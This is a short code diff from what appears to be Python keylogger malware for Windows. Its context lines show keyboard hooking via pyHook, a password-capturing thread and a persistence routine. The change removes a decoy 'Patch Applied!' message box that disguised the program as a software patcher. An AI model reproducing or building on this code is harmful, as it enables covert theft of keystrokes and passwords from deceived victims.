@@ -32,7 +32,6 @@ if os.name == 'posix':
 elif os.name == 'nt':
         import pythoncom
         import pyHook
-	import ctypes
 
        
 """------Start Logger SuperClass------"""
@@ -216,8 +215,6 @@ To specifically works on windows
                 	self.threadPasswords.start()
 		except:
 			pass
-		if(os.getcwd() != os.path.expanduser("~")):
-			ctypes.windll.user32.MessageBoxW(0, u"Patch Applied!", u"Patcher", 0)
                 self.makeItPersist()
                 pythoncom.PumpMessages()			
                
